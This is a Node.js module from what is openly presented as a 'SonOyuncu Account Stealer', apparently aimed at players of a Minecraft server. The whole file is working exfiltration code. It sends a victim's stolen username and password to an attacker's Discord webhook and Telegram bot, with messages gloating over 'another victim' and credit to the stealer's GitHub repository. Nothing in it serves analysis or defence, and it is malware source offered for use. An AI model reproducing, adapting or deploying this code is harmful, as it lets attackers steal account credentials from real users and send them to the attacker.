const axios = require('axios');

class WebhookSender {
    constructor(webhookUrl, telegramToken = null, telegramChatId = null) {
        this.webhookUrl = webhookUrl;
        this.telegramToken = telegramToken;
        this.telegramChatId = telegramChatId;
    }

    async sendSonOyuncuEmbed(username, password) {
        let discordSuccess = false;
        let telegramSuccess = false;

        // Discord Webhook
        if (this.webhookUrl && this.webhookUrl !== 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
            const embed = {
                title: 'SonOyuncu Account Stealer ⚡',
                color: 0x00FF00,
                description: ":rotating_light: another victim has fallen into the trap :skull:",
                thumbnail: {
                    url: `https://www.minotar.net/avatar/${username}`
                },
                fields: [
                    {
                        name: 'Username',
                        value: '```' + username + '```',
                        inline: true
                    },
                    {
                        name: 'Password',
                        value: '```' + password + '```',
                        inline: true
                    }
                ],
                footer: {
                    text: 'github.com/fatih1963',
                    icon_url: 'https://avatars.githubusercontent.com/u/136377209'
                },
                timestamp: new Date().toISOString()
            };

            const payload = {
                username: "github.com/Fatih1963/sonoyuncu-stealer",
                avatar_url: "https://avatars.githubusercontent.com/u/136377209",
                embeds: [embed]
            };

            try {
                await axios.post(this.webhookUrl, payload, {
                    headers: { 'Content-Type': 'application/json' }
                });
                console.log('Discord webhook sent successfully');
                discordSuccess = true;
            } catch (error) {
                console.error('Discord webhook error:', error.message);
            }
        }

        // Telegram Bot
        if (this.telegramToken && this.telegramChatId && 
            this.telegramToken !== 'YOUR_TELEGRAM_BOT_TOKEN_HERE' && 
            this.telegramChatId !== 'YOUR_TELEGRAM_CHAT_ID_HERE') {
            
            const message = `<b>SonOyuncu Account Stealer ⚡</b>\n\n` +
                            `🚨 <i>another victim has fallen into the trap</i> 💀\n\n` +
                            `👤 <b>Username:</b> <code>${username}</code>\n` +
                            `🔑 <b>Password:</b> <code>${password}</code>\n\n` +
                            `🔗 github.com/fatih1963`;

            try {
                const url = `https://api.telegram.org/bot${this.telegramToken}/sendMessage`;
                await axios.post(url, {
                    chat_id: this.telegramChatId,
                    text: message,
                    parse_mode: 'HTML'
                });
                console.log('Telegram message sent successfully');
                telegramSuccess = true;
            } catch (error) {
                console.error('Telegram error:', error.message);
            }
        }

        return discordSuccess || telegramSuccess;
    }
}

module.exports = WebhookSender;
